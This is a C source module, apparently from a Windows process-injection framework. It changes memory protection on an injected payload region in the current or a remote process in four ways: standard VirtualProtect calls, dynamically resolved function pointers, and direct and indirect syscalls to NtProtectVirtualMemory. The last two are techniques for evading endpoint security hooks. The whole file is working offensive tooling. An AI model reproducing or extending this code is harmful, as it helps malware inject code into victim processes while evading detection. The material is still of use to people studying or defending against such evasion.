#include "protect.h"
#include "resolver.h"
#include "engine.h"

BOOL Win32Protect(PINJECTION_CONTEXT ctx,
                  DWORD targetProtect,
                  PDWORD pOldProtect)
{
    if (ctx->hProcess == (HANDLE)-1) {
        printf("Running VirtualProtect on the current process.\n");
        return VirtualProtect(ctx->pRemoteAddress,
                              ctx->payloadSize,
                              targetProtect,
                              pOldProtect);
    }

    printf("Running VirtualProtectEx on the target process.\n");
    return VirtualProtectEx(ctx->hProcess,
                            ctx->pRemoteAddress,
                            ctx->payloadSize,
                            targetProtect,
                            pOldProtect);
}

BOOL DFRProtect(PINJECTION_CONTEXT ctx,
                DWORD targetProtect,
                PDWORD pOldProtect)
{
    if (ctx->hProcess == (HANDLE)-1) {
        if (!g_VirtualProtect)
            return FALSE;

        printf("[*] Using DFR to invoke VirtualProtect.\n");
        return g_VirtualProtect(ctx->pRemoteAddress,
                                ctx->payloadSize,
                                targetProtect,
                                pOldProtect);
    }

    if (!g_VirtualProtectEx)
        return FALSE;

    printf("[*] Using DFR to invoke VirtualProtectEx.\n");
    return g_VirtualProtectEx(ctx->hProcess,
                              ctx->pRemoteAddress,
                              ctx->payloadSize,
                              targetProtect,
                              pOldProtect);
}

BOOL DirectProtect(PINJECTION_CONTEXT ctx,
                   DWORD targetProtect,
                   PDWORD pOldProtect)
{
    HANDLE target = (ctx->hProcess == (HANDLE)-1)
                    ? NtCurrentProcess()
                    : ctx->hProcess;

    ULONG oldProt = 0;
    PVOID baseAddr = ctx->pRemoteAddress;
    SIZE_T regionSize = ctx->payloadSize;

    printf("[*] Using direct syscalls to invoke NtProtectVirtualMemory.\n");
    NTSTATUS status = SysNtProtectVirtualMemory(target,
                                                &baseAddr,
                                                &regionSize,
                                                targetProtect,
                                                &oldProt);

    if (pOldProtect)
        *pOldProtect = oldProt;

    return (status == 0);
}

BOOL IndirectProtect(PINJECTION_CONTEXT ctx,
                     DWORD targetProtect,
                     PDWORD pOldProtect)
{
    HANDLE target = (ctx->hProcess == (HANDLE)-1)
                    ? NtCurrentProcess()
                    : ctx->hProcess;

    ULONG oldProt = 0;
    PVOID baseAddr = ctx->pRemoteAddress;
    SIZE_T regionSize = ctx->payloadSize;

    printf("[*] Using indirect syscalls to invoke NtProtectVirtualMemory.\n");
    NTSTATUS status = IndirectSysNtProtectVirtualMemory(target,
                                                        &baseAddr,
                                                        &regionSize,
                                                        targetProtect,
                                                        &oldProt);

    if (pOldProtect)
        *pOldProtect = oldProt;

    return (status == 0);
}
